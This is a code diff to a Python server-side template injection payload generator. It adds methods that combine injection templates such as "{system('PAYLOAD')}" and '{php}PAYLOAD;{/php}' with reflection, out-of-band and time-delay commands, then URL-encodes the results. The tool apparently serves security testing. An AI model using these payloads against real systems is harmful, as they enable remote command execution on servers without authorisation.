@@ -47,7 +47,8 @@ class TemplateInjectionGenerator():
         self.domain = "127.0.0.1"
         self.sleep_timeout = 15
         self.platforms = ['linux', 'windows']
-        
+        self.url_encode_payloads = False
+
         self.evidence_strings = [
             str(self.number*self.number),
             str(self.multiply_string*self.unique_string),
@@ -77,32 +78,6 @@ class TemplateInjectionGenerator():
         input()
         return result
 
-    def generate_from_templates(self, templates, windows_payloads=True, linux_payloads=True):
-
-        result = []
-        
-        a = [
-            ("NUM",self.num),
-            ("MULTIP", self.num2)
-        ]
-
-        # Create payloads
-        changed =  [self.change_variables(t,additional=a) for t in templates]
-
-        # Change payloads in templates
-        for c in changed:
-            if "PAYLOAD" in c:
-                if windows_payloads:
-                    for p in self.windows_commands:
-                        result.append(c.replace("PAYLOAD",self.change_variables(p)))
-                if linux_payloads:
-                    for p in self.linux_commands:
-                        result.append(c.replace("PAYLOAD",self.change_variables(p)))
-            else:
-                result.append(c)
-
-        return result 
-
     def generate_razor_templates(self):
         templates = [
             "@(NUM*NUM)", "@(\"NUM\"+\"NUM\")",
@@ -130,7 +105,7 @@ class TemplateInjectionGenerator():
             "{INJ}",
             "{{=INJ}}",
             "<%INJ%>",
-            "<%=INJ%>"
+            "<%=INJ%>",
             "#{INJ}",
             "{php}PAYLOAD;{/php}",
             "{system('PAYLOAD')}",
@@ -154,15 +129,80 @@ class TemplateInjectionGenerator():
         templates.extend(self.change_templates(self.generate_razor_templates()))
         templates.extend(self.generate_java_templates())
         
+
+    
+
         # Selecting payloads
         payload_list = [c[2] for c in self.commands if c[0] in self.platforms and c[1] == 'reflection']
         changed = self.change_templates(payload_list)
 
 
         result.extend([ t.replace("PAYLOAD", p) for t in templates for p in changed])
-        return result
+
+        sorted = list(set(self.change_templates(result)))
+
+        if self.url_encode_payloads:
+            url_encoded = [self.url_encode(p) for p in sorted]
+            sorted.extend(url_encoded)
+
+        return sorted
+
+    def generate_oast_payloads(self):
+        result = []
+        # Add the polyglot first
+        result.append(self.polyglot)
+
+        templates = []
+        templates.extend(self.change_templates(self.generate_razor_templates()))
+        templates.extend(self.generate_java_templates())
+        
+
+    
+
+        # Selecting payloads
+        payload_list = [c[2] for c in self.commands if c[0] in self.platforms and c[1] == 'oast']
+        changed = self.change_templates(payload_list)
 
 
+        result.extend([ t.replace("PAYLOAD", p) for t in templates for p in changed])
 
+        sorted = list(set(self.change_templates(result)))
+
+        if self.url_encode_payloads:
+            url_encoded = [self.url_encode(p) for p in sorted]
+            sorted.extend(url_encoded)
+
+        return sorted
+
+    def generate_time_based_payloads(self):
+        result = []
+        # Add the polyglot first
+        result.append(self.polyglot)
+
+        templates = []
+        templates.extend(self.change_templates(self.generate_razor_templates()))
+        templates.extend(self.generate_java_templates())
+        
+
+    
+
+        # Selecting payloads
+        payload_list = [c[2] for c in self.commands if c[0] in self.platforms and c[1] == 'timeout']
+        changed = self.change_templates(payload_list)
+
+
+        result.extend([ t.replace("PAYLOAD", p) for t in templates for p in changed])
+
+        sorted = list(set(self.change_templates(result)))
+
+        if self.url_encode_payloads:
+            url_encoded = [self.url_encode(p) for p in sorted]
+            sorted.extend(url_encoded)
+
+        return sorted
+
+    def url_encode(self, payload):
+        return urllib.parse.quote(payload)
+    
     def change_templates(self, payloads):
         return [p.replace("UNIQUE",self.unique_string).replace("TIMEOUT", str(self.sleep_timeout)).replace("DOMAIN", self.domain).replace("NUM",str(self.number)).replace("MULTIP", str(self.multiply_string)) for p in payloads]
